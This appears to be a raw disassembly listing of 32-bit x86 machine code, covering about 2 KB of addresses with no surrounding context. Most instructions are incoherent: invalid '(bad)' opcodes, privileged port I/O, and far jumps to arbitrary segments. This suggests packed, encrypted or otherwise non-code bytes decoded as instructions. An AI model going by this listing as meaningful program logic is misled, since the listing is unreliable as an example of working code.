  41180f:	call   0xe2a2:0x77f014ec
  411816:	sti    
  411817:	out    dx,eax
  411818:	xor    DWORD PTR [eax-0x7de013aa],ebx
  41181e:	mov    ?,WORD PTR [eax+0x8]
  411821:	add    al,BYTE PTR [edx]
  411823:	ja     0x4117be
  411825:	ss ss in al,dx
  411828:	lds    esp,FWORD PTR [eax+0x71]
  41182b:	scas   eax,DWORD PTR es:[edi]
  41182c:	and    al,0xca
  41182e:	cmove  esp,esi
  411831:	(bad)  
  411832:	loope  0x411815
  411834:	mov    BYTE PTR [edi-0x6a350955],dh
  41183a:	cld    
  41183b:	push   esi
  41183c:	cmc    
  41183d:	aaa    
  41183e:	push   es
  41183f:	push   edx
  411840:	sub    ebp,0x37
  411843:	and    DWORD PTR [esi],ebp
  411845:	call   0x94f0:0x41c079e1
  41184c:	mov    ds:0xdf1b97f3,al
  411851:	jb     0x4118aa
  411853:	pop    edi
  411854:	std    
  411855:	(bad)  [edi-0x701ebc91]
  41185b:	sub    cl,ah
  41185d:	jmp    0xc35cd299
  411862:	push   ss
  411863:	or     BYTE PTR ds:0x379adbc6,cl
  411869:	fwait
  41186a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41186c:	gs xor ebp,esi
  41186f:	sub    BYTE PTR [eax],ah
  411871:	jl     0x411853
  411873:	fs push cs
  411875:	sahf   
  411876:	pop    esp
  411877:	ins    BYTE PTR es:[edi],dx
  411878:	ror    BYTE PTR [edi],1
  41187a:	cmc    
  41187b:	xor    BYTE PTR [edx+ebp*8+0x27],ch
  41187f:	pop    edx
  411880:	enter  0xbe0c,0x10
  411884:	cmp    eax,0xcd310f5b
  411889:	inc    eax
  41188a:	sahf   
  41188b:	cld    
  41188c:	bound  esp,QWORD PTR [ecx]
  41188e:	mov    dh,0x41
  411890:	pop    es
  411891:	inc    ecx
  411892:	pop    es
  411893:	jmp    0x411905
  411895:	mov    bl,0xd
  411897:	into   
  411898:	call   0x717d:0x884c9868
  41189f:	mov    ecx,?
  4118a1:	push   edi
  4118a2:	pop    ds
  4118a3:	jns    0x411837
  4118a5:	imul   ebp,DWORD PTR [edx-0x4f46e103],0x41a61dc4
  4118af:	xchg   ecx,eax
  4118b0:	pop    es
  4118b1:	inc    esp
  4118b2:	xor    DWORD PTR [esi-0x6a],esp
  4118b5:	jmp    0x41192f
  4118b7:	push   ebx
  4118b8:	xchg   edi,eax
  4118b9:	loop   0x41190e
  4118bb:	int    0xa2
  4118bd:	lods   eax,DWORD PTR ds:[esi]
  4118be:	adc    eax,0x943f5f70
  4118c3:	mov    bh,0xcb
  4118c5:	(bad)  
  4118c7:	in     al,0xf1
  4118c9:	mov    bl,0x4c
  4118cb:	ins    DWORD PTR es:[edi],dx
  4118cc:	test   al,0x63
  4118ce:	das    
  4118cf:	addr16 jno 0x411888
  4118d2:	loopne 0x411885
  4118d4:	cld    
  4118d5:	sub    ebp,0x3e
  4118d8:	and    bl,BYTE PTR [esp+ebx*2+0x3926b2d6]
  4118df:	xor    ah,dl
  4118e1:	test   eax,0xd713dda6
  4118e6:	mov    ecx,0x77d57b
  4118eb:	cmp    eax,0x77ce171d
  4118f0:	mov    ah,0x9f
  4118f2:	sbb    ebx,eax
  4118f4:	(bad)
  4118f8:	pop    ebp
  4118f9:	pop    eax
  4118fa:	jb     0x41192c
  4118fc:	inc    esp
  4118fd:	and    eax,DWORD PTR [edi+0x31]
  411900:	loop   0x4118bd
  411902:	jbe    0x4118bd
  411904:	jnp    0x4118cc
  411906:	paddsb mm7,QWORD PTR [eax+0x3e6ac386]
  41190d:	icebp  
  41190e:	in     al,0x0
  411910:	rol    DWORD PTR [esi],1
  411912:	je     0x411931
  411914:	stc    
  411915:	mov    bl,0xaa
  411917:	add    eax,0xd903a876
  41191c:	dec    esi
  41191d:	ds repnz cmp eax,0x305349c8
  411924:	and    eax,0xe3dc60e5
  411929:	mov    ah,0xe8
  41192b:	jmp    0x4119ac
  41192d:	es pop esp
  41192f:	cmp    bh,ah
  411931:	adc    al,0x88
  411933:	sbb    al,0x33
  411935:	out    dx,al
  411936:	or     al,BYTE PTR [eax+ebx*8+0x5f029760]
  41193d:	cmp    ebp,DWORD PTR [ecx-0x5ea0ac97]
  411943:	jp     0x41196f
  411945:	hlt    
  411946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411947:	adc    DWORD PTR [edi-0x7d],edx
  41194a:	mov    al,ds:0x3fed5a94
  41194f:	jecxz  0x4119b1
  411951:	frstor [edx+0x4a]
  411954:	inc    esp
  411955:	push   es
  411956:	call   0x5902:0xbb45d4d
  41195d:	int    0x5c
  41195f:	rcr    DWORD PTR [ecx+0x26],1
  411962:	pop    ss
  411963:	inc    esp
  411964:	daa    
  411965:	scas   al,BYTE PTR es:[edi]
  411966:	bound  ebp,QWORD PTR [edx+0x22]
  411969:	ss lock mov edi,0x9ca83aca
  411970:	inc    ebx
  411971:	or     ebp,DWORD PTR [edi]
  411973:	cdq    
  411974:	in     al,dx
  411975:	loopne 0x4119db
  411977:	jecxz  0x41194c
  411979:	sbb    DWORD PTR [eax-0x7c],edx
  41197c:	xor    eax,0x2fb6c6d3
  411981:	dec    edx
  411982:	xchg   ebx,eax
  411983:	mov    ecx,0xd1d790a9
  411988:	pop    es
  411989:	ffreep st(7)
  41198b:	rol    BYTE PTR [eax-0x325ce969],cl
  411991:	mov    BYTE PTR [edi+eiz*1-0x67d2c37],ch
  411998:	jle    0x4119d0
  41199a:	push   ds
  41199b:	push   esi
  41199c:	jmp    0xa80b:0xfeb0b9cc
  4119a3:	hlt    
  4119a4:	mov    ah,0xdf
  4119a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a7:	sub    DWORD PTR [esi],eax
  4119a9:	and    ch,BYTE PTR [ecx]
  4119ab:	cld    
  4119ac:	sbb    BYTE PTR [ebp+0x0],0x2e
  4119b0:	lods   eax,DWORD PTR ds:[esi]
  4119b1:	pop    ebx
  4119b2:	xchg   edx,eax
  4119b3:	mov    dl,0xba
  4119b5:	add    al,BYTE PTR [ebx-0x49]
  4119b8:	fiadd  WORD PTR [ebp+0x48]
  4119bb:	enter  0x1f7c,0x6f
  4119bf:	in     eax,0xec
  4119c1:	jnp    0x411963
  4119c3:	daa    
  4119c4:	loopne 0x4119e2
  4119c6:	fs adc eax,0x2a66c8e0
  4119cc:	test   al,0x7
  4119ce:	mul    dh
  4119d0:	cmp    al,0x79
  4119d2:	sbb    eax,0x9880e0c0
  4119d7:	dec    ecx
  4119d8:	retf   0x7ad8
  4119db:	mov    BYTE PTR [ecx+0x55],dh
  4119de:	push   cs
  4119df:	ds sub eax,ecx
  4119e2:	js     0x41199b
  4119e4:	lahf   
  4119e5:	pop    ds
  4119e6:	dec    edi
  4119e7:	mov    al,0xc7
  4119e9:	adc    BYTE PTR [edx-0x23274977],ah
  4119ef:	enter  0x1dde,0x9f
  4119f3:	aad    0x3a
  4119f5:	pmullw mm4,QWORD PTR [ebx+0x474a017f]
  4119fc:	repz in eax,0x32
  4119ff:	mov    ds:0x13ddd9ed,eax
  411a04:	clc    
  411a05:	sub    DWORD PTR [esi-0x65],0xb201e9fa
  411a0c:	popf   
  411a0d:	sbb    BYTE PTR [edx+0x762be7df],ah
  411a13:	aad    0x73
  411a15:	mov    edi,0x561c4677
  411a1a:	dec    edi
  411a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1c:	or     eax,DWORD PTR [ebp+0x26]
  411a1f:	jge    0x411a1b
  411a21:	jge    0x411a94
  411a23:	pusha  
  411a24:	rcl    DWORD PTR [edx-0x75924401],1
  411a2a:	clc    
  411a2b:	fxch   st(7)
  411a2d:	jg     0x411aad
  411a2f:	and    ecx,edi
  411a31:	add    cl,cl
  411a33:	outs   dx,BYTE PTR ds:[esi]
  411a34:	jae    0x4119e6
  411a36:	mov    cl,0xb1
  411a38:	inc    edi
  411a39:	xor    DWORD PTR [edx],ebp
  411a3b:	call   0xdeaf:0x42f835dd
  411a42:	dec    esi
  411a43:	out    0x6,eax
  411a45:	adc    DWORD PTR [ecx-0x18],ebx
  411a48:	cmp    al,BYTE PTR [eax+0x7ef71a58]
  411a4e:	cmc    
  411a4f:	fstp   DWORD PTR [edi]
  411a51:	fcomp  QWORD PTR [edx+0x2169b644]
  411a57:	inc    ebp
  411a58:	inc    edi
  411a59:	dec    edi
  411a5a:	or     dh,BYTE PTR [esi-0x8f824e9]
  411a60:	xor    eax,0xaecb1526
  411a65:	retf   0xd39f
  411a68:	jmp    0xb2ba:0xd2196b4a
  411a6f:	je     0x411a88
  411a71:	cmp    DWORD PTR [ecx+0x2],ebp
  411a74:	mov    cl,0x54
  411a76:	(bad)  
  411a77:	stc    
  411a78:	mov    ds:0x9d44e841,eax
  411a7d:	pop    eax
  411a7e:	adc    eax,0x12ebabf
  411a83:	stc    
  411a84:	loope  0x411af0
  411a86:	or     al,0x2
  411a88:	push   ecx
  411a89:	mov    WORD PTR [eax-0x4ec50152],ds
  411a8f:	jns    0x411a57
  411a91:	icebp  
  411a92:	test   al,0x16
  411a94:	cmp    bl,BYTE PTR es:[edx-0x3f1844f5]
  411a9b:	add    DWORD PTR [edx+0xb09e334],0xaf4f3d34
  411aa5:	dec    edi
  411aa6:	or     BYTE PTR [edx-0x4],bh
  411aa9:	and    DWORD PTR [ecx],edi
  411aab:	and    eax,edx
  411aad:	test   DWORD PTR [edi],esi
  411aaf:	xchg   ebp,eax
  411ab0:	ja     0x411b19
  411ab2:	add    bl,ah
  411ab4:	jnp    0x411aea
  411ab6:	rol    ch,0x43
  411ab9:	cmp    eax,0xdb984867
  411abe:	jge    0x411ae5
  411ac0:	das    
  411ac1:	xchg   edi,eax
  411ac2:	xor    eax,0xae6f35f5
  411ac7:	clc    
  411ac8:	mov    edi,0xb1d767fb
  411acd:	(bad)  
  411ace:	sar    DWORD PTR [ebx],1
  411ad0:	or     DWORD PTR [ebx],esi
  411ad2:	xchg   esp,eax
  411ad3:	cmp    ecx,DWORD PTR [esi]
  411ad5:	cli    
  411ad6:	mov    ds:0xa56a20a9,eax
  411adb:	data16 aaa 
  411add:	inc    edx
  411ade:	push   ds
  411adf:	sub    ebp,edi
  411ae1:	mov    ebp,0xcb653b00
  411ae6:	dec    esp
  411ae7:	std    
  411ae8:	push   0xffffff97
  411aea:	jle    0x411b0f
  411aec:	and    ah,BYTE PTR [edx+0x4b]
  411aef:	mov    ?,edx
  411af1:	into   
  411af2:	and    BYTE PTR [ebx],dh
  411af4:	mov    ch,0x1f
  411af6:	add    al,0xc4
  411af8:	add    DWORD PTR [edi+0x4],edx
  411afb:	cmc    
  411afc:	adc    esi,DWORD PTR [edx-0x6e7b6461]
  411b02:	aad    0xd0
  411b04:	inc    eax
  411b05:	out    0xf3,eax
  411b07:	inc    edi
  411b08:	mov    DWORD PTR [ebp+0x4c],eax
  411b0b:	mov    eax,DWORD PTR [ebp-0x38]
  411b0e:	and    ebx,0xe0e16cb4
  411b14:	cmp    BYTE PTR [esp+eax*8+0x1d],0x8b
  411b19:	add    ecx,ebp
  411b1b:	adc    al,0xf9
  411b1d:	fld    DWORD PTR [eax]
  411b1f:	push   esp
  411b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b21:	adc    ch,BYTE PTR [ecx]
  411b23:	add    ebx,ebp
  411b25:	cmp    DWORD PTR [ecx],ebp
  411b27:	sub    DWORD PTR [ebp+0x163c93a3],edx
  411b2d:	or     esi,DWORD PTR [ecx+esi*4]
  411b30:	pusha  
  411b31:	mov    edi,0xb3ef9699
  411b36:	jne    0x411b73
  411b38:	sti    
  411b39:	out    dx,al
  411b3a:	in     al,0x88
  411b3c:	cmc    
  411b3d:	mov    bh,0x8f
  411b3f:	(bad)  
  411b40:	ins    BYTE PTR es:[edi],dx
  411b41:	sbb    al,0x41
  411b43:	pop    ss
  411b44:	xchg   esi,eax
  411b45:	cmp    ecx,DWORD PTR ds:0x945e24d1
  411b4b:	xchg   BYTE PTR cs:[eax],ch
  411b4e:	cld    
  411b4f:	bound  esp,QWORD PTR [ebx+edx*1]
  411b52:	shl    ebp,cl
  411b54:	push   0x201fe516
  411b59:	int3   
  411b5a:	rol    BYTE PTR [ecx+0x6e],0xa4
  411b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b5f:	shl    DWORD PTR [esi],cl
  411b61:	xchg   ebx,eax
  411b62:	lods   eax,DWORD PTR ds:[esi]
  411b63:	or     ebp,esi
  411b65:	jae    0x411b6a
  411b67:	add    edi,DWORD PTR [edx]
  411b69:	loopne 0x411b9a
  411b6b:	and    DWORD PTR [esi+esi*2],ecx
  411b6e:	popa   
  411b6f:	(bad)  [esi+0x727ba179]
  411b75:	pop    ss
  411b76:	(bad)  
  411b77:	mov    esp,0xde86c1bf
  411b7c:	dec    esi
  411b7d:	loop   0x411b44
  411b7f:	push   esp
  411b80:	push   0xffffff9e
  411b82:	pop    esi
  411b83:	pop    ss
  411b84:	sti    
  411b85:	int    0xd0
  411b87:	adc    DWORD PTR [edi],esp
  411b89:	loop   0x411bf9
  411b8b:	add    DWORD PTR [edi-0x3cf29c6a],ebp
  411b91:	repnz push ecx
  411b93:	sbb    DWORD PTR ds:0xc1e87b1c,eax
  411b99:	xor    al,0x11
  411b9b:	in     al,0x4b
  411b9d:	imul   esp,DWORD PTR [eax+0x19a1ced7],0x35
  411ba4:	sub    eax,0x1696e151
  411ba9:	xchg   esp,eax
  411baa:	xor    BYTE PTR [ebx-0x3edfadca],0x7b
  411bb1:	std    
  411bb2:	fstp   DWORD PTR ds:0x5e31d542
  411bb8:	stos   DWORD PTR es:[edi],eax
  411bb9:	fucom  st(3)
  411bbb:	cmp    bh,BYTE PTR [ecx+0x39981f7]
  411bc1:	cmp    DWORD PTR [edx+0x55],0x9d6522b6
  411bc8:	push   ss
  411bc9:	js     0x411b80
  411bcb:	aad    0x34
  411bcd:	inc    ecx
  411bce:	ds pop eax
  411bd0:	or     BYTE PTR [edx],bl
  411bd2:	test   eax,0xdb877fc5
  411bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd8:	test   al,0xb0
  411bda:	xchg   ecx,eax
  411bdb:	cmp    al,0xf
  411bdd:	cmp    DWORD PTR [ebx+esi*8+0x51],edi
  411be1:	call   0x3ecc2687
  411be6:	pop    esi
  411be7:	or     ah,BYTE PTR [edx+0x174b9e48]
  411bed:	in     eax,dx
  411bee:	mov    ebp,DWORD PTR [edi+0x3f]
  411bf1:	dec    eax
  411bf2:	call   0xffc4:0x4a5fc4df
  411bf9:	enter  0x6016,0x9c
  411bfd:	or     DWORD PTR [eax],ecx
  411bff:	icebp  
  411c00:	xchg   esi,eax
  411c01:	adc    edx,edx
  411c03:	sbb    eax,0x3a5a992
  411c08:	and    BYTE PTR [esi+0x78],bh
  411c0b:	cmp    dh,ah
  411c0d:	idiv   BYTE PTR [esi]
  411c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c10:	and    eax,edx
  411c12:	adc    eax,0x79
  411c15:	push   esi
  411c16:	mov    ds:0xda7625c1,al
  411c1b:	push   ss
  411c1c:	push   0x6307a1d7
  411c21:	and    DWORD PTR [esi+0x1b8df140],edi
  411c27:	sar    BYTE PTR [ebx-0x4d],1
  411c2a:	and    eax,0x65e7b24b
  411c2f:	aam    0xdc
  411c31:	dec    edi
  411c32:	bound  edx,QWORD PTR [esi+0x18]
  411c35:	xchg   esp,eax
  411c36:	pop    esi
  411c37:	add    DWORD PTR [eax],0xffffffdc
  411c3a:	imul   BYTE PTR [ecx-0xc]
  411c3d:	fist   DWORD PTR ds:0x888a674e
  411c43:	sub    BYTE PTR [ebx],al
  411c45:	pop    ecx
  411c46:	jmp    0x6a987961
  411c4b:	out    dx,eax
  411c4c:	pop    ebx
  411c4d:	fcom   DWORD PTR [ebp+edx*8-0x3a]
  411c51:	(bad)  
  411c52:	xchg   edx,eax
  411c53:	loopne 0x411c34
  411c55:	jg     0x411c85
  411c57:	mov    esi,0xf908014e
  411c5c:	int3   
  411c5d:	ds xor ch,bl
  411c60:	mov    DWORD PTR [edx+0x74],ebp
  411c63:	(bad)  
  411c64:	(bad)  
  411c65:	ins    BYTE PTR es:[edi],dx
  411c66:	retf   0x828d
  411c69:	or     eax,DWORD PTR [esi-0x17]
  411c6c:	sbb    DWORD PTR [ecx],ecx
  411c6e:	mov    edx,0x11d448ef
  411c73:	fist   DWORD PTR [eax-0x1252008e]
  411c79:	jle    0x411c65
  411c7b:	cdq    
  411c7c:	or     al,0x31
  411c7e:	add    DWORD PTR [edx-0x6c],edx
  411c81:	popa   
  411c82:	pop    eax
  411c83:	jge    0x411c4d
  411c85:	mov    ah,0x9c
  411c87:	nop
  411c88:	jle    0x411c7f
  411c8a:	lahf   
  411c8b:	and    esp,DWORD PTR [eax]
  411c8d:	fwait
  411c8e:	xor    ah,BYTE PTR [esp+esi*2+0x26]
  411c92:	imul   esp,edi,0x10
  411c95:	mov    esp,0xc431898
  411c9a:	(bad)  
  411c9b:	in     eax,0xad
  411c9d:	into   
  411c9e:	aad    0x1b
  411ca0:	int3   
  411ca1:	ds xchg ecx,eax
  411ca3:	in     eax,dx
  411ca4:	mov    dl,0xda
  411ca6:	femms  
  411ca8:	or     al,0x57
  411caa:	pop    ecx
  411cab:	xor    eax,0x1cfa8de0
  411cb0:	pop    esp
  411cb1:	mov    fs,WORD PTR [ebx]
  411cb3:	jg     0x411cbf
  411cb5:	mov    ch,BYTE PTR [ebp+0x6c]
  411cb8:	push   edi
  411cb9:	xchg   esp,eax
  411cba:	sbb    BYTE PTR [eax-0x5d2a2bd0],al
  411cc0:	dec    edx
  411cc1:	out    dx,al
  411cc2:	jl     0x411cef
  411cc4:	lods   al,BYTE PTR ds:[esi]
  411cc5:	inc    ebx
  411cc6:	iret   
  411cc7:	dec    ebx
  411cc8:	mov    cl,0xfd
  411cca:	xchg   ebp,ebx
  411ccc:	mov    al,0x74
  411cce:	clc    
  411ccf:	test   al,0x66
  411cd1:	rcr    BYTE PTR [edx-0x6a],1
  411cd4:	sub    al,0x2
  411cd6:	adc    al,0x36
  411cd8:	cmc    
  411cd9:	add    BYTE PTR [ecx+eax*1+0x59748e1],dl
  411ce0:	clc    
  411ce1:	ins    BYTE PTR es:[edi],dx
  411ce2:	jecxz  0x411cb4
  411ce4:	mov    edi,0x190a3e87
  411ce9:	mov    dh,0x5
  411ceb:	and    ch,0xa
  411cee:	iret   
  411cef:	in     eax,0xa0
  411cf1:	dec    edi
  411cf2:	mov    esi,0x24f59a5e
  411cf7:	test   BYTE PTR [eax+0x6a02bd51],bh
  411cfd:	cmp    eax,0x8fc19866
  411d02:	ds mov bh,0xc7
  411d05:	sar    DWORD PTR ds:0xbfeff316,cl
  411d0b:	jmp    0x411d13
  411d0d:	mov    ecx,0x52e3efa4
  411d12:	loop   0x411d63
  411d14:	mov    eax,ds:0xa27222f6
  411d19:	fsubr  QWORD PTR [esi+0x66]
  411d1c:	xor    cl,dl
  411d1e:	sbb    edx,DWORD PTR [esi+0x23]
  411d21:	sub    DWORD PTR [edx+0x7f],ebp
  411d24:	out    0x1f,eax
  411d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d27:	inc    ecx
  411d28:	jb     0x411d58
  411d2a:	xchg   ecx,eax
  411d2b:	imul   DWORD PTR [ebp+0x3a4a4722]
  411d31:	cld    
  411d32:	stos   DWORD PTR es:[edi],eax
  411d33:	in     eax,0x86
  411d35:	test   BYTE PTR [edi],ah
  411d37:	jne    0x411d69
  411d39:	jb     0x411ccd
  411d3b:	jl     0x411cd2
  411d3d:	sub    edx,esi
  411d3f:	xchg   cl,dh
  411d41:	fs retf 0xae65
  411d45:	cld    
  411d46:	dec    ebp
  411d47:	clc    
  411d48:	xchg   edx,eax
  411d49:	(bad)  
  411d4a:	jmp    0xcae5:0x458d79c9
  411d51:	scas   eax,DWORD PTR es:[edi]
  411d52:	fcompp 
  411d54:	sar    BYTE PTR [eax-0x513ac186],0x7e
  411d5b:	and    eax,0xbdf5f0d1
  411d60:	xchg   ebx,eax
  411d61:	sbb    al,0x1c
  411d63:	or     esp,DWORD PTR [esi]
  411d65:	add    eax,0x585befbe
  411d6a:	cwde   
  411d6b:	adc    BYTE PTR gs:[edi-0xb20a52],al
  411d72:	cmp    DWORD PTR [ebx+0x17],0xdd6d2f88
  411d79:	and    DWORD PTR [edx],ebx
  411d7b:	add    al,BYTE PTR [ebp+0x67]
  411d7e:	inc    esp
  411d7f:	push   ss
  411d80:	xchg   ecx,eax
  411d81:	push   ebp
  411d82:	mov    edi,0xd3435019
  411d87:	add    eax,0x7387aa72
  411d8c:	out    dx,al
  411d8d:	(bad)
  411d91:	jae    0x411d16
  411d93:	les    eax,FWORD PTR [eax-0x8c698d4]
  411d99:	adc    al,0x8c
  411d9b:	or     al,ah
  411d9d:	shl    BYTE PTR [ebp+0x67816696],0xed
  411da4:	push   esp
  411da5:	mov    dh,BYTE PTR [edi+0x301bb92a]
  411dab:	jno    0x411de8
  411dad:	pop    edi
  411dae:	xchg   dh,bh
  411db0:	pop    esi
  411db1:	xlat   BYTE PTR ds:[ebx]
  411db2:	xlat   BYTE PTR ds:[ebx]
  411db3:	(bad)  
  411db4:	adc    DWORD PTR [ebx-0xc],esp
  411db7:	rol    BYTE PTR es:[edi+0x7401f2b6],cl
  411dbe:	sub    DWORD PTR [ebp+edi*1+0x116ebfb2],ebp
  411dc5:	pop    eax
  411dc6:	ficom  WORD PTR [edi+0x51d560d2]
  411dcc:	cmp    ebx,DWORD PTR [esi+eax*2+0x1b]
  411dd0:	div    BYTE PTR [edx]
  411dd2:	push   0xffffffd3
  411dd4:	dec    esp
  411dd5:	pop    esp
  411dd6:	mov    BYTE PTR [ebx+0x7],dh
  411dd9:	and    ecx,DWORD PTR [edx]
  411ddb:	iret   
  411ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ddd:	mov    ebx,0x8285d336
  411de2:	jae    0x411e0d
  411de4:	jge    0x411d7b
  411de6:	xchg   edi,eax
  411de7:	pop    ecx
  411de8:	out    0xbe,eax
  411dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411deb:	fwait
  411dec:	cmp    DWORD PTR [esi],ecx
  411dee:	stos   DWORD PTR es:[edi],eax
  411def:	arpl   WORD PTR [esi+edx*2],bx
  411df2:	push   es
  411df3:	popf   
  411df4:	dec    ebp
  411df5:	int    0xa9
  411df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411df8:	and    ebp,DWORD PTR [eax-0x60]
  411dfb:	jmp    DWORD PTR [ebx+0x4d802534]
  411e01:	sti    
  411e02:	sub    dh,BYTE PTR [esi+ebp*2+0x772177f6]
  411e09:	popf   
  411e0a:	jecxz  0x411e0d
  411e0c:	or     ebx,esi
  411e0e:	sub    DWORD PTR [edi+0x21],edx
  411e11:	inc    ecx
  411e12:	fsub   QWORD PTR [esi]
  411e14:	xor    eax,0xc89181de
  411e19:	mov    ebp,0x7c740529
  411e1e:	je     0x411e55
  411e20:	in     al,0x27
  411e22:	pop    edi
  411e23:	gs jmp 0x1700:0x7ecd0e0a
  411e2b:	adc    eax,0x3273b9b8
  411e30:	loopne 0x411e25
  411e32:	xor    BYTE PTR [esi+0x40248217],dl
  411e38:	cs dec esp
  411e3a:	data16 jmp 0x411e98
  411e3d:	push   edi
  411e3e:	inc    DWORD PTR ds:0x9d4b65e7
  411e44:	sbb    DWORD PTR [esp+eax*2],edx
  411e47:	dec    edi
  411e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e49:	xchg   ecx,eax
  411e4a:	cmp    bh,BYTE PTR [edx-0x6b13305e]
  411e50:	cmc    
  411e51:	mov    edx,0x534f3282
  411e56:	ficom  DWORD PTR [esi]
  411e58:	or     BYTE PTR [esi],bh
  411e5a:	es repz jmp 0x411ea9
  411e5e:	(bad)
  411e61:	adc    edx,edi
  411e63:	jg     0x411e1d
  411e65:	lea    edx,[ebx-0x7c1a95c3]
  411e6b:	push   ds
  411e6c:	popf   
  411e6d:	lods   eax,DWORD PTR ds:[esi]
  411e6e:	pop    ecx
  411e6f:	sbb    esp,edi
  411e71:	pop    ecx
  411e72:	jl     0x411e41
  411e74:	push   esp
  411e75:	push   ecx
  411e76:	inc    eax
  411e77:	pop    ds
  411e78:	or     eax,0x3c3d0cc3
  411e7d:	jbe    0x411e9b
  411e7f:	xchg   esi,eax
  411e80:	loop   0x411ee5
  411e82:	dec    ecx
  411e83:	or     esp,DWORD PTR [edi]
  411e85:	out    0xcc,eax
  411e87:	push   ebp
  411e88:	adc    eax,0x2f7c0b9
  411e8d:	aad    0xa0
  411e8f:	pop    eax
  411e90:	or     ebx,DWORD PTR [edi]
  411e92:	aaa    
  411e93:	inc    ecx
  411e94:	jns    0x411ef5
  411e96:	aas    
  411e97:	stos   DWORD PTR es:[edi],eax
  411e98:	mov    ch,0xeb
  411e9a:	dec    ebx
  411e9b:	push   esi
  411e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9d:	clc    
  411e9e:	shl    BYTE PTR [ebp+0xcf1d80c],0x35
  411ea5:	mov    al,ds:0x98ed5fed
  411eaa:	pusha  
  411eab:	stc    
  411eac:	xlat   BYTE PTR ds:[ebx]
  411ead:	add    DWORD PTR [esi],esi
  411eaf:	inc    edx
  411eb0:	jno    0x411e83
  411eb2:	les    esi,FWORD PTR [ebp-0x507a739]
  411eb8:	adc    eax,0x4bb429d6
  411ebd:	lea    esi,[eax+eax*2+0x30]
  411ec1:	jb     0x411eef
  411ec3:	jmp    0xf2aa:0xd1efe6ae
  411eca:	inc    ecx
  411ecb:	retf   0x7d35
  411ece:	(bad)  
  411ed0:	push   ds
  411ed1:	ret    
  411ed2:	stos   DWORD PTR es:[edi],eax
  411ed3:	rcl    DWORD PTR [esi+0x46ce2807],0xc9
  411eda:	call   0xe830:0x62c239aa
  411ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ee2:	jmp    0x411f10
  411ee4:	(bad)
  411ee7:	dec    edx
  411ee8:	inc    edx
  411ee9:	mov    ecx,0x995c7fe9
  411eee:	add    BYTE PTR [ebp+ecx*2-0x7c],dh
  411ef2:	in     eax,0x52
  411ef4:	iret   
  411ef5:	icebp  
  411ef6:	cli    
  411ef7:	repnz es adc dl,ch
  411efb:	push   ecx
  411efc:	sbb    al,0x20
  411efe:	popa   
  411eff:	aam    0xdd
  411f01:	adc    BYTE PTR ds:0x8bfe9c6,ah
  411f07:	cdq    
  411f08:	fs out dx,ax
  411f0b:	ror    edi,0x64
  411f0e:	dec    esi
  411f0f:	pop    esp
  411f10:	push   ebx
  411f11:	jg     0x411f73
  411f13:	sub    eax,eax
  411f15:	fcom   st(4)
  411f17:	sbb    DWORD PTR [edx],esi
  411f19:	dec    ecx
  411f1a:	lods   al,BYTE PTR ds:[esi]
  411f1b:	popa   
  411f1c:	scas   al,BYTE PTR es:[edi]
  411f1d:	xchg   ecx,eax
  411f1e:	mov    edi,0x29ca9a27
  411f23:	neg    BYTE PTR [esi-0xb]
  411f26:	adc    esp,eax
  411f28:	(bad)  
  411f2a:	adc    eax,0x1986292c
  411f2f:	ror    esi,0xf
  411f32:	adc    esp,edi
  411f34:	outs   dx,DWORD PTR ds:[esi]
  411f35:	out    0x9a,eax
  411f37:	pop    ebx
  411f38:	or     DWORD PTR [edi-0x527c878a],esp
  411f3e:	add    BYTE PTR [ecx],dl
  411f40:	int    0x6b
  411f42:	outs   dx,BYTE PTR ds:[esi]
  411f43:	lods   al,BYTE PTR ds:[esi]
  411f44:	dec    ebx
  411f45:	mov    ch,0x95
  411f47:	and    edi,DWORD PTR [ebp+0xab60ef1]
  411f4d:	in     eax,dx
  411f4e:	leave  
  411f4f:	inc    edi
  411f50:	or     al,0x6f
  411f52:	test   ah,al
  411f54:	sub    eax,0xb75b8899
  411f59:	cli    
  411f5a:	xor    bh,BYTE PTR [ecx-0xe]
  411f5d:	inc    esp
  411f5e:	(bad)  
  411f5f:	popa   
  411f60:	scas   al,BYTE PTR es:[edi]
  411f61:	xchg   ebp,eax
  411f62:	mov    ds:0x4a7584e9,eax
  411f67:	call   0x43257b58
  411f6c:	pop    ss
  411f6d:	jns    0x411f5d
  411f6f:	into   
  411f70:	daa    
  411f71:	fstp   st(2)
  411f73:	clc    
  411f74:	mov    bl,0x8f
  411f76:	aad    0xe5
  411f78:	jo     0x411f36
  411f7a:	inc    ebx
  411f7b:	mov    dl,0x30
  411f7d:	inc    edx
  411f7e:	hlt    
  411f7f:	pop    ecx
  411f80:	xchg   ecx,eax
  411f81:	cmp    DWORD PTR ds:0xd3ecabd8,esp
  411f87:	pop    edi
  411f88:	mov    ah,0x5b
  411f8a:	pop    ebp
  411f8b:	add    bh,BYTE PTR [edi+0x72]
  411f8e:	pusha  
  411f8f:	cmp    eax,0xd5e311a
  411f94:	mov    bl,0xc0
  411f96:	ins    DWORD PTR es:[edi],dx
  411f97:	mov    ebp,0x627c662e
  411f9c:	(bad)  
  411f9d:	mov    ds:0xa524977a,eax
  411fa2:	pop    ebp
  411fa3:	inc    edx
  411fa4:	mov    bh,0x46
  411fa6:	inc    esi
  411fa7:	pusha  
  411fa8:	add    al,0x7b
  411faa:	cld    
  411fab:	fild   WORD PTR [ecx-0x31]
  411fae:	rol    DWORD PTR ds:0x2736b50,cl
  411fb4:	cmc    
  411fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fb6:	leave  
  411fb7:	sub    al,0xed
  411fb9:	cdq    
  411fba:	shr    dl,0xe4
  411fbd:	jne    0x411ff0
